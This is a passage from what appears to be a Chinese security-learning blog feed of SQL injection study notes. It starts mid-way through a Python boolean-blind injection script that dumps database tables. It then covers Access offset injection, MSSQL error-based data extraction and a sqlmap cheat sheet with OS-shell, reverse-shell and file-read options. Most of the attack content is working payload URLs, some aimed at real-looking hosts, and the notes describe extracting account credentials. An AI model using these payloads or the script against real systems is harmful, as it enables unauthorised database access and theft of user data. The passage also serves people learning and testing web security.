&gt; 1:</span><br><span class="line">                    midx = int((max + min) / 2)</span><br><span class="line">                    dump_data_payload = url + &quot; and ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d --+&quot; % (</span><br><span class="line">                        i, db_name, tb_name, j, l, midx)</span><br><span class="line">                    # print(dump_data_payload)</span><br><span class="line">                    r = requests.get(dump_data_payload)</span><br><span class="line">                    if str in r.text:</span><br><span class="line">                        min = midx</span><br><span class="line">                    else:</span><br><span class="line">                        max = midx</span><br><span class="line">                dump_data += chr(max)</span><br><span class="line">            dump_data_list.append(dump_data)</span><br><span class="line">            dump_data = &#x27;&#x27;</span><br><span class="line">            # print( dump_data_list)</span><br><span class="line">    print(&quot;[+]%s数据库的%s表的数据:&quot; % (db_name, tb_name))</span><br><span class="line">    j = 0</span><br><span class="line">    num_1 = len(dump_data_list) // data_num</span><br><span class="line">    for i in range(data_num):</span><br><span class="line">        j = i</span><br><span class="line">        for k in range(num_1):</span><br><span class="line">            print(&quot;%s\t\t&quot; % dump_data_list[j], end=&#x27;&#x27;)</span><br><span class="line">            j = i + data_num</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def re(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;如需跑其他表,请输入任意字符,否则输入No(例如 admin):&quot;)</span><br><span class="line">        if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(tb_name_list)</span><br><span class="line">            column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">            dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;请输入URL:&quot;)  # 目标url http://127.0.0.1/sqli/Less-5/?id=1</span><br><span class="line">str = input(&quot;请输入正确页面返回字符串:&quot;)  # 布尔型盲注的true&amp;false的判断因素 You are in</span><br><span class="line">url = close(url)</span><br><span class="line">ascii_list = db_ascii_list()</span><br><span class="line">db_name = db_name(url, str, ascii_list)</span><br><span class="line">tb_name_list = tb_name(url, str, ascii_list, db_name)</span><br><span class="line">column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line">re(url, str, ascii_list, tb_name_list, db_name)</span><br></pre></td></tr></table></figure><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/bc35f8dd4f7c</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/fcae21926e5c</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15WEB漏洞--SQL注入之Oracle、MongoDB注入</title>
      <link href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>Access，mysql，mongoDB，postsql，sqlite，oracle，sybase等</p><p>mysql mssql等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据库A</span><br><span class="line">表名</span><br><span class="line">列名</span><br><span class="line">数据</span><br><span class="line">数据库B</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>Access </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  表名</span><br><span class="line"></span><br><span class="line">   列名</span><br><span class="line"></span><br><span class="line">数据</span><br></pre></td></tr></table></figure><p>  access数据库没有数据库名，数据库会保存在网站源码下面，数据库是独立的，所以无法进行跨库注入，access没有向其他数据库一样的功能，没有文件读写的功能。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104696.png" alt="image-20210827145602483"></p><h4 id="什么决定网站注入点用户权限？"><a href="#什么决定网站注入点用户权限？" class="headerlink" title="什么决定网站注入点用户权限？"></a>什么决定网站注入点用户权限？</h4><p>数据库配置文件的用户，是谁连接的  </p><h3 id="简要学习各种数据库的注入特点"><a href="#简要学习各种数据库的注入特点" class="headerlink" title="简要学习各种数据库的注入特点"></a>简要学习各种数据库的注入特点</h3><p>数据库架构组成，数据库高权限操作</p><h3 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h3><p>正常情况下，access注入需要通过猜解表名和字段名去注入。</p><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47744/new_list.asp?id=1&#x27;#页面报错</span><br><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 and 1=1    #页面正常</span><br><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 and 1=2   #页面报错</span><br></pre></td></tr></table></figure><p>说明是数字型注入</p><h4 id="判断是不是access数据库"><a href="#判断是不是access数据库" class="headerlink" title="判断是不是access数据库"></a>判断是不是access数据库</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若带入 and (<span class="function">select <span class="title">count</span><span class="params">(*)</span> from msysobjects)&gt;0 </span></span><br><span class="line"><span class="function">由于msysobjects表在access数据库中无权访问所以返回错误--为access数据库</span></span><br></pre></td></tr></table></figure><p>因为access数据库有时候添加上面的语句就报错，所以我们不知道是不是access数据库，这里我们根据脚本语言判断 如果语言为asp,基本就是access数据库，aspx可能是mssql很少是access。所以我们要判断是不是access数据库。只需要看是不是asp 语言，如果是aspx就判断他是不是MSSQL数据库即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#若带入and (select count(*) from sysobjects)&gt;0 </span><br><span class="line">#由于sysobjects表在MSSQL数据库中可以正常访问所以当返回正常页面时表示为MSSQL数据库</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and (select count(*) from sysobjects)&gt;0    #错误表示不是mssql,而是access、数据库</span><br></pre></td></tr></table></figure><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>如果有回显的话可以用联合注入,无回显就用盲注</p><p>order by 语句判断列数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 order by 4</span><br></pre></td></tr></table></figure><h5 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h5><p>因为我们已经知道字段数了，所以剩下的就是表名了，这个需要自己去猜，或者使用工具跑，正确就会返回回显的位置，错误就会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 union select 1,2,3,4 from admin(自己猜测的)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select * from admin) #判断查询结果是否存在</span><br></pre></td></tr></table></figure><h5 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h5><p>然后就是猜列名，一顿猜。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 union select 1,username,passwd,4 from admin(自己猜测的)</span><br></pre></td></tr></table></figure><p>也可以这样猜，盲注一般用这个，因为没有回显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id from admin)   #页面返回正常表示存在</span><br><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id,username from admin)   #页面返回正常表示存在</span><br></pre></td></tr></table></figure><h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><p><strong>偏移注入主要是针对知道表，但是不知道字段的。</strong></p><p>这里我已经知道了表明是：sys_admin</p><p>可以使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from sys_admin);</span><br></pre></td></tr></table></figure><p>来猜测是否有sys_admin表，如果说存在的话页面就会显示正常。</p><p><strong>00x1 判断字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/newslist.asp?id=688 order by 19 #错误</span><br><span class="line">http://www.test.com/newslist.asp?id=688 order by 18 #正确</span><br></pre></td></tr></table></figure><p><strong>00x2 爆出显示位</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105187.png" alt="image-20210827161837286" style="zoom:67%;" /> <p><strong>00x3 判断表内存在的字段数</strong></p><p>接下来我们利用“<em>”代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。这里”</em>“也可以使用sys_admin.*代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误</span><br><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin    #错误</span><br><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin      #错误</span><br><span class="line">直到.........http://www.test.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确</span><br></pre></td></tr></table></figure><p>18-11=7，也就是说明sys_admin表有7个字段</p><p><strong>偏移注入的基本公式为:</strong></p><p>​      <strong>order by 出的字段数减去</strong><em><strong>号的字段数</strong>，然而再用</em><em>order by的字段数减去</em>*<strong>2倍刚才得出来的答案</strong></p><p>　　　　也就是18-11=7</p><p>　　　　　　　18-7*2=4</p><p>得到答案等于：4</p><p>然后依旧是套公式的过程。</p><p>这里的id必须是存在的。也是就说必须要知道一个字段，所以要靠运气。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。</span><br><span class="line">#后面的是sql，可作公式。</span><br></pre></td></tr></table></figure><p>如此便爆出了账号密码。</p><p>但是我测试的这个网站，略微有点特殊。如下图所示</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105080.png" alt="image-20210827172708527"></p><h3 id="SQL-server-MSSQL注入"><a href="#SQL-server-MSSQL注入" class="headerlink" title="SQL server/MSSQL注入"></a>SQL server/MSSQL注入</h3><p><strong>①</strong>判断数据库类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</span><br></pre></td></tr></table></figure><p><strong>②</strong>判断数据库版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--这个语句要在有回显的模式下才可以哦</span><br><span class="line">and substring((select  @@version),22,4)=&#x27;2008&#x27;--</span><br><span class="line">适用于无回显模式，后面的2008就是数据库版本，返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2008的话就返回正常）</span><br></pre></td></tr></table></figure><p><strong>③</strong>获取所有数据库的个数 (一下3条语句可供选择使用) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. and 1=(select quotename(count(name)) from master..sysdatabases)--</span><br><span class="line">2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --</span><br><span class="line">3. and 1=(select str(count and 1=(select quotename(count(name)) from master..sysdatabases where dbid&gt;5)--</span><br><span class="line">   and 1=(select str(count(name))%2b&#x27;|&#x27; from master..sysdatabases where dbid&gt;5) --</span><br><span class="line">   and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --</span><br><span class="line">说明：dbid从1-4的数据库一般为系统数据库.</span><br></pre></td></tr></table></figure><p><strong>⑤</strong>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--</span><br></pre></td></tr></table></figure><p><strong>⑥</strong>获取当前数据库 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br><span class="line">and 1=(select db_name())--</span><br></pre></td></tr></table></figure><p><strong>⑦</strong>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))-- </span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from 数据库名..sysobjects where xtype=&#x27;U&#x27;  FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line">复制代码测试效果图：得到  3个敏感的表：Whir_Sec_Users/Whir_Mem_Member/Whir_Mem_MemberGroup</span><br></pre></td></tr></table></figure><p><strong>⑧</strong>获得表里的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一次爆指定表的所有列（只限于mssql2005及以上版本）:</span><br><span class="line">and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#x27;指定表名&#x27;) FOR XML PATH(&#x27;&#x27;))-- </span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#x27;指定表名&#x27;) FOR XML PATH(&#x27;&#x27;))--</span><br></pre></td></tr></table></figure><p>效果图：既然有账户信息，我就不管是不是管理员的的了，我帖子的目的不是为了得到管理员的信息，只是为了演示可以通过这个方法来获取相关信息。</p><p><strong>⑨</strong>获取指定数据库中的表的列的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）:</span><br><span class="line">and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">一次性爆N条所有字段的数据（只限于mssql2005及以上版本）:</span><br><span class="line">and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">复制代码第一条语句：</span><br><span class="line">and 1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">测试效果图：----------------------------------</span><br><span class="line">加上where条件筛选结果出来会更加好，</span><br><span class="line">如：where and name like &#x27;%user%&#x27; 就会筛选出含有user关键词的出来。用在筛选表段时很不错。</span><br></pre></td></tr></table></figure><p>注意：在使用一次获取数据库信息的语句时，请使用火狐浏览器，笔者测试  IE8、360急速浏览器、猎豹浏览器均卡死，火狐浏览器也会导致出现几秒钟的卡死，弹出框框，我们点击“停止脚本”就会得到初步解决。！！！！！！！！！！！！！！！！！！！！至此，我们已经得到了账户信息了，至于管理员的呢，哈哈，大家自行测试时换表啥的就好了。</p><h3 id="PostgraSQL注入原理"><a href="#PostgraSQL注入原理" class="headerlink" title="PostgraSQL注入原理"></a>PostgraSQL注入原理</h3><p>直接参考这个，没必要记住，能看懂就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.webshell.cc/524.html</span><br><span class="line">https://www.cnblogs.com/yilishazi/p/14710349.html</span><br><span class="line">https://www.jianshu.com/p/ba0297da2c2e</span><br></pre></td></tr></table></figure><h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/peterpan0707007/p/8242119.html</span><br></pre></td></tr></table></figure><h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881753/article/details/87981552</span><br><span class="line">https://www.secpulse.com/archives/3278.html</span><br></pre></td></tr></table></figure><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><h4 id="sqlmap支持的数据库"><a href="#sqlmap支持的数据库" class="headerlink" title="sqlmap支持的数据库"></a>sqlmap支持的数据库</h4><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">基本操作笔记：-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;  恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6) </span><br><span class="line">    0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">    1：显示信息和警告消息。</span><br><span class="line">    2：显示调试消息。</span><br><span class="line">    3：有效载荷注入。</span><br><span class="line">    4：显示HTTP请求。</span><br><span class="line">    5：显示HTTP响应头。</span><br><span class="line">    6：显示HTTP响应页面的内容</span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span><br><span class="line">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads     #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span><br><span class="line">-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 </span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt  字段字典  　 </span><br><span class="line">common-outputs.txt</span><br><span class="line">common-tables.txt      表字典</span><br><span class="line">keywords.txt</span><br><span class="line">oracle-default-passwords.txt</span><br><span class="line">user-agents.txt</span><br><span class="line">wordlist.txt</span><br></pre></td></tr></table></figure><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/bmjoker/p/9326258.html</span><br><span class="line"></span><br><span class="line">https://github.com/youngyangyang04/NoSQLAttack</span><br><span class="line"></span><br><span class="line">https://github.com/sqlmapproject/sqlmap/zipball/master</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_39936434/category_9103379.html</span><br><span class="line"></span><br><span class="line">https://www.mozhe.cn/bug/WUJ3OGVQSTIyeXdvbHU2ZmV0MjVDUT09bW96aGUmozhe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14WEB漏洞--SQL注入之类型及提交注入</title>
      <link href="/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/14WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</url>
      
